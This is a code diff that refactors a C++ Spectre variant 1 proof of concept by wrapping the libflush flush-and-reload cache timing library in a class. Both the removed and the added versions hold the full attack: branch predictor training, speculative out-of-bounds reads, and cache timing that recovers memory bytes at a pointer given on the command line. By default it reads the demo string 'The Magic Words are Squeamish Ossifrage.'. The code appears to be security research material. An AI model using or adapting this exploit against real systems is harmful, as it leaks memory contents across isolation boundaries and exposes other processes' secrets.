@@ -10,90 +10,46 @@
 #define CACHE_LINE_SIZE 512
 #define ALIGN_CACHE __attribute__ ((aligned (512)))
 
+#define MAIN_THREAD_CPU 0
+#define COUNTER_THREAD_CPU 1
+
 #define CONCAT_(x,y) x##y
 #define CONCAT(x,y) CONCAT_(x,y)
 #define PAD uint8_t ALIGN_CACHE CONCAT(pad_, __LINE__);
 
-class Spectre {
-  uint8_t    ALIGN_CACHE array2[256 * CACHE_LINE_SIZE];
-  uint8_t    ALIGN_CACHE array1[CACHE_LINE_SIZE];
-  uint32_t   ALIGN_CACHE array1_size;
-
+class LibFlush {
 public:
-  Spectre() {
-    /* Initialize with zeros to ensure that is not on a copy-on-write zero pages */
-    memset(this, 0, sizeof(*this));
-    array1_size = sizeof(array1);
-  }
+  libflush_session_t* session = nullptr;
+  int cache_hit_threshold;
 
-  /* Report best guess in value[0] and runner-up in value[1] */
-  void readMemoryByte(libflush_session_t* libflush_session, const void* target_ptr, int cache_hit_threshold, uint8_t value[2], int score[2]) {
-    size_t malicious_x = (size_t)target_ptr - (size_t)array1;
-    int results[256];
-    int tries, first, second;
-    size_t training_x, x;
-    volatile uint8_t * addr;
-
-    for (int i = 0; i < 256; i++)
-      results[i] = 0;
-    for (tries = 999; tries > 0; tries--) {
-
-      /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-      training_x = tries % array1_size;
-      for (int i = 5; i >= 0; i--) {
-        libflush_flush(libflush_session, & array1_size);
-        /* Flush array2[256*(0..255)] from cache */
-        for (int i = 0; i < 256; i++)
-          libflush_flush(libflush_session, & array2[i * CACHE_LINE_SIZE]); /* intrinsic for clflush instruction */
-
-        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
-
-        /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
-        /* Avoid jumps in case those tip off the branch predictor */
-        x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
-        x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
-        x = training_x ^ (x & (malicious_x ^ training_x));
-
-        /* Call the victim! */
-        if (x < array1_size) {
-          array2[array1[x] * CACHE_LINE_SIZE] = 0;
-        }
-      }
-
-      /* Time reads. Order is mixed up to prevent stride prediction */
-      for (int i=0, mix=157; i < 256; i++, mix=(mix+167) & 0xFF) {
-        addr = & array2[mix * CACHE_LINE_SIZE];
-        uint64_t access_time = libflush_reload_address(libflush_session, (void*)addr);
-        if (access_time <= cache_hit_threshold)
-            results[mix]++; /* cache hit - add +1 to score for this value */
-      }
-
-      /* Locate highest & second-highest results results tallies in j/k */
-      first = second = -1;
-      for (int i = 0; i < 256; i++) {
-        if (first < 0 || results[i] >= results[first]) {
-          second  = first;
-          first = i;
-        } else if (second < 0 || results[i] >= results[second]) {
-          second = i;
-        }
-      }
-      if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0))
-        break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+  LibFlush(size_t counter_thread_cpu=COUNTER_THREAD_CPU) {
+    libflush_session_args_t libflush_args = {
+      .bind_to_cpu = counter_thread_cpu
+    };
+    if (libflush_init(&session, &libflush_args) == false) {
+      throw "Error: Could not initialize libflush";
     }
-    value[0] = (uint8_t) first;
-    score[0] = results[first];
-    value[1] = (uint8_t) second;
-    score[1] = results[second];
+
+    cache_hit_threshold = find_cache_hit_threshold();
   }
-} ALIGN_CACHE;
 
-Spectre spectre;
+  ~LibFlush() {
+    libflush_terminate(session);
+  }
 
-/********************************************************************
-Analysis code
-********************************************************************/
-int find_cache_hit_threshold(libflush_session_t* libflush_session) {
+  inline void flush(void* ptr) {
+    libflush_flush(session, ptr);
+  }
+
+  inline uint64_t access_time(void* ptr) {
+    return libflush_reload_address(session, ptr);
+  }
+
+  inline bool is_cache_hit(void* ptr) {
+    return access_time(ptr) <= cache_hit_threshold;
+  }
+
+  int find_cache_hit_threshold() {
     const int test_count = 32;
     int hit_times[test_count];
     int miss_times[test_count];
@@ -101,9 +57,9 @@ int find_cache_hit_threshold(libflush_session_t* libflush_session) {
     static uint8_t ALIGN_CACHE flush_benchmark[CACHE_LINE_SIZE];
 
     for (int i=0; i<test_count; i++) {
-        libflush_flush(libflush_session, &flush_benchmark);
-        miss_times[i] = libflush_reload_address(libflush_session, &flush_benchmark);
-        hit_times[i] = libflush_reload_address(libflush_session, &flush_benchmark);
+        flush(&flush_benchmark);
+        miss_times[i] = access_time(&flush_benchmark);
+        hit_times[i] = access_time(&flush_benchmark);
     }
 
     std::sort(hit_times, hit_times+test_count);
@@ -127,12 +83,92 @@ int find_cache_hit_threshold(libflush_session_t* libflush_session) {
     int threshold = (hit_times[(int)(0.95*(test_count-1))] + miss_times[(int)(0.05*(test_count-1))]) / 2;
     printf("Cache threshold: %d\n", threshold);
     return threshold;
-}
+  }
+};
+
+class Spectre {
+  LibFlush& libflush;
+  uint8_t    ALIGN_CACHE array2[256 * CACHE_LINE_SIZE];
+  uint8_t    ALIGN_CACHE array1[CACHE_LINE_SIZE];
+  uint32_t   ALIGN_CACHE array1_size;
 
 
+public:
+  Spectre(LibFlush& libflush)
+  : libflush(libflush)
+  {
+    /* Initialize with zeros to ensure that is not on a copy-on-write zero pages */
+    memset(&array2, 0, sizeof(array2));
+    memset(&array1, 0, sizeof(array1));
+    memset(&array1_size, 0, sizeof(array1_size));
 
-#define MAIN_THREAD_CPU 0
-#define COUNTER_THREAD_CPU 1
+    array1_size = sizeof(array1);
+  }
+
+  /* Report best guess in value[0] and runner-up in value[1] */
+  void readMemoryByte(const void* target_ptr, uint8_t value[2], int score[2]) {
+    size_t malicious_x = (size_t)target_ptr - (size_t)array1;
+    int results[256];
+    int tries, first, second;
+    size_t training_x, x;
+
+    for (int i = 0; i < 256; i++)
+      results[i] = 0;
+    for (tries = 999; tries > 0; tries--) {
+
+      /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+      training_x = tries % array1_size;
+      for (int i = 5; i >= 0; i--) {
+        libflush.flush(&array1_size);
+        /* Flush array2[256*(0..255)] from cache */
+        for (int i = 0; i < 256; i++)
+          libflush.flush(&array2[i * CACHE_LINE_SIZE]); /* intrinsic for clflush instruction */
+
+        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+
+        /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
+        /* Avoid jumps in case those tip off the branch predictor */
+        x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
+        x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
+        x = training_x ^ (x & (malicious_x ^ training_x));
+
+        /* Call the victim! */
+        if (x < array1_size) {
+          array2[array1[x] * CACHE_LINE_SIZE] = 0;
+        }
+      }
+
+      /* Time reads. Order is mixed up to prevent stride prediction */
+      for (int i=0, mix=157; i < 256; i++, mix=(mix+167) & 0xFF) {
+        uint8_t* addr = &array2[mix * CACHE_LINE_SIZE];
+        if (libflush.is_cache_hit(addr)) {
+          results[mix]++; /* cache hit - add +1 to score for this value */
+        }
+      }
+
+      /* Locate highest & second-highest results results tallies in j/k */
+      first = second = -1;
+      for (int i = 0; i < 256; i++) {
+        if (first < 0 || results[i] >= results[first]) {
+          second  = first;
+          first = i;
+        } else if (second < 0 || results[i] >= results[second]) {
+          second = i;
+        }
+      }
+      if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0))
+        break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+    }
+    value[0] = (uint8_t) first;
+    score[0] = results[first];
+    value[1] = (uint8_t) second;
+    score[1] = results[second];
+  }
+} ALIGN_CACHE;
+
+LibFlush libflush(COUNTER_THREAD_CPU);
+Spectre spectre(libflush);
+
 int main(int argc, const char** argv) {
   // Read CLI arguments: data pointer and lenght
   const char* target_ptr = "The Magic Words are Squeamish Ossifrage.";
@@ -143,29 +179,18 @@ int main(int argc, const char** argv) {
     sscanf(argv[2], "%d", & target_len);
   }
 
-  // Initialize libflush
-  libflush_session_args_t args = {
-    .bind_to_cpu = COUNTER_THREAD_CPU
-  };
-  libflush_session_t* libflush_session;
-  if (libflush_init(&libflush_session, &args) == false) {
-    fprintf(stderr, "Error: Could not initialize libflush\n");
-    return -1;
-  }
   if (libflush_bind_to_cpu(MAIN_THREAD_CPU) == false) {
     fprintf(stderr, "Warning: Could not bind main thread to CPU %d\n", MAIN_THREAD_CPU);
     return -1;
   }
-
-  int cache_threshold = find_cache_hit_threshold(libflush_session);
 
   printf("Reading %d bytes at %p\n", target_len, target_ptr);
   while (target_len--) {
     uint8_t value[2];
     int score[2];
 
-    printf("Reading at %p... ", (void*) target_ptr);
-    spectre.readMemoryByte(libflush_session, target_ptr++, cache_threshold, value, score);
+    printf("Reading at %p... ", target_ptr);
+    spectre.readMemoryByte(target_ptr++, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
@@ -174,12 +199,5 @@ int main(int argc, const char** argv) {
     printf("\n");
   }
 
-  find_cache_hit_threshold(libflush_session);
-
-  // terminate libflush
-  if (libflush_terminate(libflush_session) == false) {
-    fprintf(stderr, "Error: Could not terminate libflush\n");
-    return -1;
-  }
   return (0);
 }
